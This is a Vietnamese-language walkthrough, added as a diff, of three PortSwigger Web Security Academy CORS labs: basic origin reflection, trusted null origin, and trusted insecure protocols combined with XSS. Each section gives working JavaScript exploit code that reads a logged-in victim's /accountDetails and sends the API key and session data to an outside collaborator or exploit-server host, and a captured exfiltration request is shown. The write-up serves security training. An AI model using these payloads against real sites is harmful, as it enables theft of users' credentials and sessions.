@@ -1,0 +1,79 @@
+1: CORS vulnerability with basic origin reflection
+
+Khi đăng nhập và vào trong /my-account ta thấy nó có fetch đến một địa chỉ /accountDetails trả về 1 json gồm APIKEY(flag của bài)
+Ta tiến hành lấy mã ở trong exploit-server, tuy nhiên vì log của exploit-server không hỗ trợ đọc chi tiết req nên ta sẽ lấy giá trị của APIKEY thông qua BurpCollabrator với đoạn script sau:
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://0a8900870487800ec0e7e0af00930074.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+   location='//guewvddg6gfsfkytmfvtgzjsqjwak08p.oastify.com/log?key='+this.responseText;
+};
+</script>
+
+Bấm deliver view to victim
+
+Sau khi đợi một lúc ở Collabrator sẽ có một HTTP req chứa APIKEY:
+
+GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22{{{{{8aX5IdqDM3IzrelHOwTu0Wi9uZfeft47}}}}}%22,%20%20%22sessions%22:%20[%20%20%20%20%22wE5HdGBQVEVxnxhiGUN2KCTvkbNw7yEw%22%20%20]} HTTP/1.1
+Host: guewvddg6gfsfkytmfvtgzjsqjwak08p.oastify.com
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: document
+Referer: https://exploit-0a88002804408015c0fadf49014400a5.exploit-server.net/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US
+
+2: CORS vulnerability with trusted null origin
+
+Tương tự như câu 1 ta thấy thông tin cần lấy trong /accountDetails. Thêm nữa, khi thêm header (Origin: null) thì nhận về header chấp nhận nullorigin, vì vậy ta sẽ chuyển một sandbox iframe đến victim vì nó có chứa origin null header:
+
+<html>
+<body>
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0a74009d035c613cc05711a900c0009d.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='exploit-0ace004c03a2611ec05f0e0501df00bf.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+</body>
+</html>
+
+Bấm delivery view to victim, vào log của exploit sever ta sẽ thấy APIKEY của admin
+
+3: CORS vulnerability with trusted insecure protocols
+
+Sau khi kiểm tra ta thấy không thể bypass orgin bằng cách đặt vul web là subdomain của exploitserver.
+Tuy nhiên ở trong phần stock lại có thể thực hiện XSS, ta tiến hành XSS để có thể lấy APIKEY từ web dựa vào đoạn HTML sau:
+
+<html>
+<body>
+<script>
+    document.location="http://stock.0a8400dc03b99ccbc18c449500dd004a.web-security-academy.net/?productId=1
+    <script>
+    var req=new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0a8400dc03b99ccbc18c449500dd004a.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+    location='https://exploit-0ac900b703079c31c1a44332011d0031.exploit-server.net/log?key='+this.responseText;
+    };
+    </script>&storeId=1"
+</script>
+</body>
+</html>
+
+Bấm deliver view to victim và vào /log của exploitserver, tìm req gần nhất để lấy APIKEY của admin
